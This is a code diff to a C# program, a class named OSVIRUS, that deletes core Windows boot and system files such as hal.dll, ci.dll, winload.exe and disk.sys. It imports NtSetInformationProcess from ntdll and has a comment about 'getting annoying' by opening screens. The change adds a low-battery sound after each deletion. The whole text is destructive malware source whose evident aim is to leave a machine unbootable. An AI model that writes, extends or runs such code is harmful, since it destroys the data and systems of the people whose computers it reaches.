@@ -27,6 +27,7 @@ namespace WindowsFormsApp1
         private SoundPlayer _soundplayer;
 
         string sound_file = @"C:\Windows\Media\Windows Critical Stop.wav"; // defined sound
+        string sound_file_dying = @"C:\Windows\Media\Windows Battery Low.wav"; // defined sound
         [DllImport("ntdll.dll", SetLastError = true)]
         private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
         public OSVIRUS()
@@ -65,22 +66,42 @@ namespace WindowsFormsApp1
             if (File.Exists(hal_dll))
             {
                 File.Delete(hal_dll);
+                if (File.Exists(sound_file_dying))
+                {
+                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                }
             }
             if (File.Exists(ci_dll))
             {
                 File.Delete(ci_dll);
+                if (File.Exists(sound_file_dying))
+                {
+                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                }
             }
             if (File.Exists(winload_exe))
             {
                 File.Delete(winload_exe);
+                if (File.Exists(sound_file_dying))
+                {
+                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                }
             }
             if (File.Exists(disk_sys))
             {
                 File.Delete(disk_sys);
+                if (File.Exists(sound_file_dying))
+                {
+                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                }
             }
             if (File.Exists(memoryanyalizer))
             {
                 File.Delete(memoryanyalizer);
+                if (File.Exists(sound_file_dying))
+                {
+                    _soundplayer = new SoundPlayer(@"C:\Windows\Media\Windows Battery Low.wav");
+                }
             }
             // Now we get annoying with opening screens.
             Random r;
